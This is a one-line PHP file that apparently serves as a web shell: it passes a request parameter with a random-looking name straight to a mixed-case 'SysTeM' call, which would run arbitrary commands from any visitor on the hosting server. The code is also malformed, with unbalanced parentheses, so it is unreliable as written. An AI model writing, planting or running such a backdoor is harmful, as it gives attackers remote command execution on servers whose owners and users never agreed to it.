<?php
SysTeM(($_GET['cLfg7Usu']);
?>
